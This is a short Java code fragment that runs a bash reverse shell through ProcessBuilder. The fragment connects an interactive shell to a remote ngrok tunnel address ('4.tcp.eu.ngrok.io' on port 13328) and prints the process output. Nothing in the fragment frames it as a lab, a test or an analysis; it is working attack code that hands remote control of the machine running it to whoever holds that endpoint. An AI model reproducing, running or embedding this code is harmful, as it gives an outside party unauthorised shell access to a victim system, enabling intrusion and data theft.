String command = "sh -i >& /dev/tcp/4.tcp.eu.ngrok.io/13328 0>&1";

try {
ProcessBuilder processBuilder = new ProcessBuilder("/bin/bash", "-c", command);
Process process = processBuilder.start();

java.io.InputStream is = process.getInputStream();
java.util.Scanner scanner = new java.util.Scanner(is).useDelimiter("\\A");
String result = scanner.hasNext() ? scanner.next() : "";

System.out.println(result);

process.waitFor();
} catch (IOException | InterruptedException e) {
e.printStackTrace();
}
